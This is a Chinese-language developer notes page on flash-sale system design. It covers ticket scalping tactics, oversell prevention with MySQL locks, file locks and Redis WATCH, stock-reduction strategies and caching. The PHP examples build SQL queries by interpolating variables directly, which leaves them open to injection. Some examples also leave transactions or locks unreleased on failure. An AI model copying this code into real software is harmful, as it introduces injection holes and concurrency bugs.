看到这里是否明白为什么抢不到火车票？如果只是老老实实地去抢票真的很难。通过多账号的方式,火车票的黄牛将很多车票的名额占据,部分强大的黄牛在处理验证码方面更是技高一筹
高级的黄牛刷票时在识别验证码的时候使用真实的人,中间搭建一个展示验证码图片的中转软件服务,真人浏览图片并填写下真实验证码,返回给中转软件。对于这种方式,验证码的保护限制作用被废除了,目前也没有很好的解决方案。

因为火车票是根据身份证实名制的,这里还有一个火车票的转让操作方式。大致的操作方式是先用买家的身份证开启一个抢票工具,持续发送请求,黄牛账号选择退票,然后黄牛买家成功通过自己的身份证购票成功。当一列车厢没有票了的时候,是没有很多人盯着看的,况且黄牛们的抢票工具也很强大,即使看见有退票,也不一定能抢得过他们,最终黄牛顺利将火车票转移到买家的身份证下。

解决方案:
并没有很好的解决方案,唯一可以动心思的也许是对账号数据进行"数据挖掘",这些黄牛账号也是有一些共同特征的,例如经常抢票和退票,节假日异常活跃等,将它们分析出来再做进一步处理和甄别。

三、高并发下的数据安全
在多线程写入同一个文件的时候会存现"线程安全"的问题,多个线程同时运行同一段代码,如果每次运行结果和单线程运行的结果是一样的,结果和预期相同就是线程安全的。如果是MySQL数据库,可以使用它自带的锁机制很好的解决问题,但在大规模并发的场景中是不推荐使用MySQL的。
秒杀和抢购的场景中还有另外一个问题就是超发,如果在这方面控制不慎会产生发送过多的情况。如某些电商搞抢购活动,买家成功拍下后,商家却不承认订单有效,拒绝发货。这里的问题也许并不一定是商家奸诈,而是系统技术层面存在超发风险导致的。

第一种方案：在每次下订单前判断促销商品的数量够不够,不够不允许下订单,更改库存量时加上一个条件,只更改商品库存大于0的商品的库存,使用ab进行压力测试,当并发超过500,访问量超过2000时,还是会出现超卖现象,所以被否定了。

第二种方案：使用mysql的事务加排他锁来解决,首先选择数据库的存储引擎为innoDB,使用的是排他锁实现的,刚开始的时候测试了下共享锁,发现还是会出现超卖的现象。有个问题是,当进行高并发测试时,对数据库的性能影响很大,导致数据库的压力很大,最终也被否定了。

第三种方案：使用文件锁实现。当用户抢到一件促销商品后先触发文件锁,防止其他用户进入,该用户抢到促销品后再解开文件锁,放其他用户进行操作。这样可以解决超卖的问题,但会导致文件得I/O开销很大。

最后使用了redis的队列来实现,将要促销的商品数量以队列的方式存入redis中,每当用户抢到一件促销商品则从队列中删除一个数据,确保商品不会超卖,因为pop操作是原子的,即使有很多用户同时到达,也是依次执行。这个操作起来很方便,而且效率极高,最终我们采取这种方式来实现

1. 超发的原因
假设某个抢购场景中一共只有100个商品,在最后一刻已经消耗了99个商品,仅剩最后一个。这个时候系统发来多个并发请求,这批请求读取到的商品余量都是99个,然后都通过了这一个余量判断,最终导致超发

优化方案1：将库存字段number字段设为unsigned,因为字段不能为负数,当库存为0时将会返回false

</pre><textarea>include('./mysql.php');
$username = 'wang'.rand(0,1000);
//生成唯一订单
function build_order_no(){
  return date('ymd').substr(implode(NULL, array_map('ord', str_split(substr(uniqid(), 7, 13), 1))), 0, 8);
}
//记录日志
function insertLog($event,$type=0,$username){
    global $conn;
    $sql="insert into ih_log(event,type,usernma) values('$event','$type','$username')";
    return mysqli_query($conn,$sql);
}
function insertOrder($order_sn,$user_id,$goods_id,$sku_id,$price,$username,$number){
    global $conn;
    $sql="insert into ih_order(order_sn,user_id,goods_id,sku_id,price,username,number) values('$order_sn','$user_id','$goods_id','$sku_id','$price','$username','$number')";
    return  mysqli_query($conn,$sql);
}
//模拟下单操作
//库存是否大于0
$sql="select number from ih_store where goods_id='$goods_id' and sku_id='$sku_id' ";
$rs=mysqli_query($conn,$sql);
$row = $rs->fetch_assoc();
  if($row['number']>0){  // 高并发下会导致超卖
      if($row['number']<$number){
        return insertLog('库存不够',3,$username);
      }
      $order_sn=build_order_no();
      $sql="update ih_store set number=number-{$number} where sku_id='$sku_id' and number>0"; // 库存减少
      $store_rs=mysqli_query($conn,$sql);
      if($store_rs){  //生成订单
          insertOrder($order_sn,$user_id,$goods_id,$sku_id,$price,$username,$number);
          insertLog('库存减少成功',1,$username);
      }else{
          insertLog('库存减少失败',2,$username);
      }
  }else{
      insertLog('库存不够',3,$username);
  }

</textarea><pre>
2. 悲观锁思路
解决线程安全的思路很多,可以从"悲观锁"的方向开始讨论。
悲观锁也就是在修改数据的时候采用锁定状态,排斥外部请求的修改,遇到加锁的状态就必须等待。
虽然上述的方案的确解决了线程安全的问题,但场景是高并发,也就是说会很多这样的修改请求,每个请求都需要等待锁,某些线程可能永远都没有机会抢到这个锁,这种请求就会死在那里。同时这种请求会很多,瞬间增大系统的平均响应时间,结果是可用连接数被耗尽,系统陷入异常。

</pre>优化方案2：使用MySQL的事务,锁住操作的行<textarea>include('./mysql.php');
//生成唯一订单号
function build_order_no(){
  return date('ymd').substr(implode(NULL, array_map('ord', str_split(substr(uniqid(), 7, 13), 1))), 0, 8);
}
//记录日志
function insertLog($event,$type=0){
    global $conn;
    $sql="insert into ih_log(event,type)
    values('$event','$type')";
    mysqli_query($conn,$sql);
}
//模拟下单操作
//库存是否大于0
mysqli_query($conn,"BEGIN");  //开始事务
$sql="select number from ih_store where goods_id='$goods_id' and sku_id='$sku_id' FOR UPDATE";//此时这条记录被锁住,其它事务必须等待此次事务提交后才能执行
$rs=mysqli_query($conn,$sql);
$row=$rs->fetch_assoc();
if($row['number']>0){
    $order_sn=build_order_no();  //生成订单
    $sql="insert into ih_order(order_sn,user_id,goods_id,sku_id,price)
    values('$order_sn','$user_id','$goods_id','$sku_id','$price')";
    $order_rs=mysqli_query($conn,$sql);
    $sql="update ih_store set number=number-{$number} where sku_id='$sku_id'";  //库存减少
    $store_rs=mysqli_query($conn,$sql);
    if($store_rs){
        echo '库存减少成功';
        insertLog('库存减少成功');
        mysqli_query($conn,"COMMIT");//事务提交即解锁
    }else{
        echo '库存减少失败';
        insertLog('库存减少失败');
    }
}else{
    echo '库存不够';
    insertLog('库存不够');
    mysqli_query($conn,"ROLLBACK");
}

</textarea><pre>
3. FIFO队列思路
直接将请求放入队列中的,采用FIFO(First Input First Output,先进先出),这样的话就不会导致某些请求永远获取不到锁,有点强行将多线程变成单线程的感觉
然后现在解决了锁的问题,全部请求采用"先进先出"的队列方式来处理。那么新的问题来了,高并发的场景下,因为请求很多,很可能一瞬间将队列内存撑爆,然后系统又陷入到了异常状态。或者设计一个极大的内存队列,也是一种方案,但系统处理完一个队列内请求的速度根本无法和疯狂涌入队列中的数目相比。也就是说队列内的请求会越积累越多,最终Web系统平均响应时候还是会大幅下降,系统还是陷入异常。

4. 文件锁的思路
对于日IP不高或并发数不是很大的应用,一般不用考虑这些！用一般的文件操作方法完全没有问题。但如果并发高,对文件进行读写操作时很有可能多个进程对进一文件进行操作,如果这时不对文件的访问进行相应的独占,就容易造成数据丢失

</pre>优化方案4：使用非阻塞的文件排他锁<textarea>include ('./mysql.php');
//生成唯一订单号
function build_order_no(){
  return date('ymd').substr(implode(NULL, array_map('ord', str_split(substr(uniqid(), 7, 13), 1))), 0, 8);
}
//记录日志
function insertLog($event,$type=0){
    global $conn;
    $sql="insert into ih_log(event,type)
    values('$event','$type')";
    mysqli_query($conn,$sql);
}
$fp = fopen("lock.txt", "w+");
if(!flock($fp,LOCK_EX | LOCK_NB)){
    echo "系统繁忙,请稍后再试";
    return;
}
//下单
$sql="select number from ih_store where goods_id='$goods_id' and sku_id='$sku_id'";
$rs =  mysqli_query($conn,$sql);
$row = $rs->fetch_assoc();
if($row['number']>0){//库存是否大于0
    //模拟下单操作
    $order_sn=build_order_no();
    $sql="insert into ih_order(order_sn,user_id,goods_id,sku_id,price)
    values('$order_sn','$user_id','$goods_id','$sku_id','$price')";
    $order_rs =  mysqli_query($conn,$sql);
    //库存减少
    $sql="update ih_store set number=number-{$number} where sku_id='$sku_id'";
    $store_rs =  mysqli_query($conn,$sql);
    if($store_rs){
        echo '库存减少成功';
        insertLog('库存减少成功');
        flock($fp,LOCK_UN);//释放锁
    }else{
        echo '库存减少失败';
        insertLog('库存减少失败');
    }
}else{
  echo '库存不够';
    insertLog('库存不够');
}
fclose($fp);

</textarea><pre>
5. 乐观锁思路
乐观锁是相对于"悲观锁"采用更为宽松的加锁机制,大都是采用带版本号(Version)更新。实现就是这个数据所有请求都有资格去修改,但会获得一个该数据的版本号,只有版本号符合的才能更新成功,其他的返回抢购失败。这样的话就不需要考虑队列的问题,不过会增大CPU的计算开销,但综合来说这是一个比较好的解决方案。
有很多软件和服务都"乐观锁"功能的支持,例如Redis中的watch就是其中之一,通过这个实现保证了数据的安全。

</pre><textarea>$redis = new redis();
$result = $redis->connect('127.0.0.1', 6379);
echo $mywatchkey = $redis->get("mywatchkey");

/*
//插入抢购数据
if($mywatchkey>0){
  $redis->watch("mywatchkey");
  //启动一个新的事务。
  $redis->multi();
  $redis->set("mywatchkey",$mywatchkey-1);
  $result = $redis->exec();
  if($result) {
    $redis->hSet("watchkeylist","user_".mt_rand(1,99999),time());
    $watchkeylist = $redis->hGetAll("watchkeylist");
    echo "抢购成功！< br/>";
    $re = $mywatchkey - 1;
    echo "剩余数量：".$re."< br/>";
    echo "用户列表：< pre>";
    print_r($watchkeylist);
  }else{
    echo "手气不好,再抢购！";exit;
  }
}else{
  // $redis->hSet("watchkeylist","user_".mt_rand(1,99999),"12");
  //  $watchkeylist = $redis->hGetAll("watchkeylist");
  echo "fail！< br/>";
  echo ".no result< br/>";
  echo "用户列表：< pre>";
  //  var_dump($watchkeylist);
}
*/

$rob_total = 100;   //抢购数量
if($mywatchkey<=$rob_total){
  $redis->watch("mywatchkey");
  $redis->multi(); //在当前连接上启动一个新的事务。
  //插入抢购数据
  $redis->set("mywatchkey",$mywatchkey+1);
  $rob_result = $redis->exec();
  if($rob_result){
    $redis->hSet("watchkeylist","user_".mt_rand(1, 9999),$mywatchkey);
    $mywatchlist = $redis->hGetAll("watchkeylist");
    echo "抢购成功！< br/>";

    echo "剩余数量：".($rob_total-$mywatchkey-1)."< br/>";
    echo "用户列表：< pre>";
    var_dump($mywatchlist);
  }else{
    $redis->hSet("watchkeylist","user_".mt_rand(1, 9999),'meiqiangdao');
    echo "手气不好,再抢购！";exit;
  }
}

</textarea><pre>
【 数据库减库存几种方法 】
对于减库存的操作,需要先从一个更高的Level来看一下,先不用讨论update减1的问题。可以把减库存形为简单的分成以下几种：
1、团购类减库存(库存无限,卖的越多越好)
2、限时活动类(24小时活动产品)
3、秒杀抢购类活动
4、正常商品售卖
当然还别的形式,可能有的减订单操作是一个复合型的业务：如12306这样的业务,含秒杀,抢购,限时活动于一身,难度空前绝后

那么再来看一下订单系统里几个难题：
1. 超卖,听说某米是允许在商品接近预警时自动关闭交易(商品下架),并允许一定的超售现象。
2. 羊毛党下单不支付,活动结束,一个也没卖出去。有的电商的做法是,付款后再减库存,不付款不减,可能出现的问题是,用户犹豫一下,去付款时,告诉你没货了,体验不好。
3. 高并发的抢购,打压到DB中,把DB打死的问题。比较常见的一个问题,早些年某电商还发布过把MySQL死锁去掉的分支,用于支撑抢购里业务,现在MySQL 8.0天生支持,另外也可以考虑在在业务层Nginx上控制。

可以把减库存分为两种：
正常商品售卖类减库存
活动促销类减库存

问题分为：是否允许超卖,要不要考虑羊毛党的一些形为,处理好这些问题的情况下支撑高并发业务

分成几种情况来讨论：

1、用户下单减库存
如果允许超卖的情况下, 外加一个预警商品下架(缺货)逻辑来处理,基本可以很快速的跑起来。 业务逻辑最简单适合正常商品逻辑。库存大于多少可以上架之类的一些处理(后台人工调配) 如果不允许超卖, 例如车票这类,处理的办法不在是简单的库存结构设计,可以把每个坐位做为一个商品上架构, 只是车票商品上的属性有自已是那个车,挨着谁之类的信息即可。下单后锁定30分钟,可以目前各大电商的主流逻辑,只是不同的平台锁时时间不一样。 防止用户下单后几天后还不支付,让商品可以回归库存,不支付订单的失效过程。下单减库存也是大家最容易接受的一个形为,但这里把最难的问题抛给了平台,一个商品多少没支付返回库存,目前来看不同平台处理的形为不一样。不适用于抢购,秒杀点业务。

2、支付减库存
抢购,秒杀,谁先付款谁得的逻辑。 这样可以避免羊毛党下单后不支付的形为,例如本来只有10个特价产品,羊毛党手快,下单成功,但种种原因没支付,提示商品已售完,但活动结束了,一个商品也没卖出去,老板花的活动费白花了。

3、高并发的抢购业务
例如某米周二中午的抢购,10万个商品,可能是100万人在抢购,这种形为,如果都打到DB,可能是对DB的锁也是一个挑战,可能出现的形为就是不该慢的也慢了,去除检查也是一个好办法。

现在聪明的人类想好了更好的办法,利用Nginx+LUA引入接入在接层引入摇号方法,基于Cookie在Nginx层拿到了可以购买的资格再往后面放,如果没拿到这个资格就在Nginx上看看,提示你商品已经售完就行。这样每次扩容,只用扩一下Nginx接入层就Ok了,其它不用扩了。

问题分类后,现在来看,对于减库存,如果分类处理后,发现还是挺容易处理的,这里面里也不要来聊用MySQL的乐观锁控制来减库存了,多点写入的乐观锁控制会造成更新丢失的现象,同样来讲,单节点的同时并发,不是串行的情况,这事没戏,确时见过有的公司在这块用了串行事务,他们也跑的挺好,业务量不大

【 服务器缓存 】
缓存指的是将需要频繁访问的网络内容存放在离用户较近、访问速度更快的系统中,以提高内容访问速度的一种技术。缓存服务器就是存放频繁访问内容的服务器。

业务服务器缓存
业务服务器缓存是将动态页面直接生成静态的页面放在服务器上的硬盘里,用户调取相同页面时,静态页面将直接下载到客户端,不再需要通过程序的运行和数据库的访问,大大节约了服务器的负载。
每次访问页面时,会检测相应的缓存页面是否存在,若不存在,则连接数据库得到数据渲染页面并生成缓存页面文件,这样下次访问的页面文件就能发挥作用了

代理服务器缓存
代理服务器是客户端和业务服务器之间的中间服务器,客户端先向这个中间服务器发起请求,经过处理后,再将请求转发到业务服务器。代理服务器缓存的运作原理跟浏览器的运作原理差不多,只是规模更大。可以把它理解为一个共享缓存,不只为一个用户服务,一般为大量用户提供服务,因此在减少相应时间和带宽使用方面很有效,同一个缓存数据会被重复使用多次

两种主要的Web缓存:
直接缓存,将用户频繁访问的来自Internet服务器的Web对象的拷贝保存在企业本地网络中。
反向缓存,企业内部Web服务器的Web对象的拷贝保存在企业网络边缘的代理服务器上以提高外界访问企业站点的性能。

Web缓存可以根据不同等级进行配置:
本地缓存:将Web对象缓存的拷贝保存在本地计算机中。大多数流行的Web浏览器默认情况下保留一个先前访问对象的缓存。例如IE称之为"临时Internet文件"。本地缓存拷贝只是在用户频繁地从同一台机器访问页面时有用。
代理缓存:代理服务器是为公司内的多个用户/客户计算机缓存Web对象的单独机器。它们是位于客户端和托管的Web服务器之间的计算机,而且它们比本地缓存效率更高,因为在企业本地网络中的任何用户或计算机访问某个Web对象时,缓存拷贝对想访问该对象的任何其他用户/计算机是可用的,无需到Internet服务器上再次下载它。代理缓存可以在网络边缘与防火墙结合使用。

</pre>
</div>

<p><a href="http://www.cnblogs.com/qq350760546/p/6638588.html">web攻击参考资料</a></p>
</main>
    <ol>
        <li>
          <a href="#sys">system ▼</a>
          <ul>
            <li><a href="#sublime">sublime</a></li>
            <li><a href="#configfile">configfile</a></li>
            <li><a href="#seo">SEO</a></li>
            <li><a href="#url">URL编码</a></li>
            <li><a href="#ascii">ASCII</a></li>
            <li><a href="#htmlcode">htmlcode</a></li>
            <li><a href="#ncr">ncr编码字符</a></li>
            <li><a href="#keycode">keycode</a></li>
            <li><a href="#Mime-Type">Mime-Type</a></li>
            <li><a href="#color">color</a></li>
          </ul>
        </li>
        <li>
          <a href="#win">windows ▼</a>
          <ul>
            <li><a href="#cmd">CMD</a></li>
            <li><a href="#sysdoscmd">系统命令</a></li>
            <li><a href="#filedoscmd">文件命令</a></li>
            <li><a href="#networkdoscmd">网络命令</a></li>
            <li><a href="#serverdoscmd">服务命令</a></li>
          </ul>
        </li>
        <li>
          <a href="#bat">bat ▼</a>
          <ul>
            <li><a href="#fuhao">符号</a></li>
            <li><a href="#var">变量</a></li>
            <li><a href="#subprogram">子程序</a></li>
            <li><a href="#if">if</a></li>
            <li><a href="#for">for</a></li>
            <li><a href="#useage">应用</a></li>
          </ul>
        </li>
        <li><a href="#vbs">vbs</a></li>
        <li><a href="#powershell">powershell</a></li>
        <li><a href="#ftp">ftp</a></li>
        <li><a href="#git">git</a></li>
        <li><a href="#virtualbox">virtualbox</a></li>
        <li>
          <a href="#linux">linux ▼</a>
          <ul>
              <li><a href="#linuxSys">linux sys</a></li>
              <li><a href="#userlogin">user login</a></li>
              <li><a href="#baseCommand">baseCommand</a></li>
              <li><a href="#dirfile">dir file</a></li>
              <li><a href="#syscmd">系统命令</a></li>
              <li><a href="#calc">calc</a></li>
              <li><a href="#redirect-pipe-xargs">重定向管道xargs</a></li>
              <li><a href="#vim">vim</a></li>
              <li><a href="#apt">apt</a></li>
              <li><a href="#awk">awk</a></li>
              <li><a href="#mail">mail</a></li>
              <li><a href="#crontab">crontab</a></li>
            </ul>
        </li>
        <li>
          <a href="#shell">shell ▼</a>
          <ul>
            <li><a href="#shell_var">变量</a></li>
            <li><a href="#calcfuhao">符号</a></li>
            <li><a href="#shell_str">string</a></li>
            <li><a href="#shell_arr">array</a></li>
            <li><a href="#shell_arg">arguments</a></li>
            <li><a href="#shell_calc">运算符</a></li>
            <li><a href="#shell_flow">流程控制</a></li>
            <li><a href="#shell_func">function</a></li>
            <li><a href="#shell_file">文件包含</a></li>
            <li><a href="#shell_eg">demos</a></li>
          </ul>
        </li>
        <li><a href="#curl_wget">curl wget</a></li>
        <li>
          <a href="#nginx">nginx ▼</a>
          <ul>
            <li><a href="#nginx_install">nginx_install</a></li>
            <li><a href="#nginx_use">nginx_use</a></li>
            <li><a href="#nginx_php">nginx_php</a></li>
            <li><a href="#nginx_conf">nginx_conf</a></li>
            <li><a href="#nginx_rewrite">nginx_rewrite</a></li>
            <li><a href="#nginx_if">nginx_if</a></li>
            <li><a href="#nginx_var">nginx_var</a></li>
            <li><a href="#nginx_limit">nginx_limit</a></li>
            <li><a href="#nginx_debug">nginx_debug</a></li>
            <li><a href="#nginx_thinkphp">nginx_thinkphp</a></li>
            <li><a href="#lamp">lamp</a></li>
            <li><a href="#lnmp">lnmp</a></li>
            <li><a href="#wnmp">wnmp</a></li>
          </ul>
        </li>
        <li>
          <a href="#docker">docker ▼</a>
          <ul>
            <li><a href="#docker_install">install</a></li>
            <li><a href="#docker_repository">repository</a></li>
            <li><a href="#docker_image">image</a></li>
            <li><a href="#commit_build">commit build</a></li>
            <li><a href="#docker_container">container</a></li>
            <li><a href="#docker_network">network</a></li>
            <li><a href="#docker_data_manager">data manager</a></li>
            <li><a href="#docker_hot_images">hot images</a></li>
            <li><a href="#docker_example">example</a></li>
            <li><a href="#docker_compose">docker-compose</a></li>
          </ul>
        </li>
        <li><a href="#http">http协议</a></li>
        <li><a href="#restful">restful</a></li>
        <li><a href="#architecture">architecture架构</a></li>
        <li><a href="#separation">前后端分离</a></li>
        <li><a href="#miaosha">秒杀架构</a></li>
    </ol>

    <script src="vendors/jquery-3.3.1.min.js"></script>
    <script src="vendors/public.js"></script>
</body>

</html>
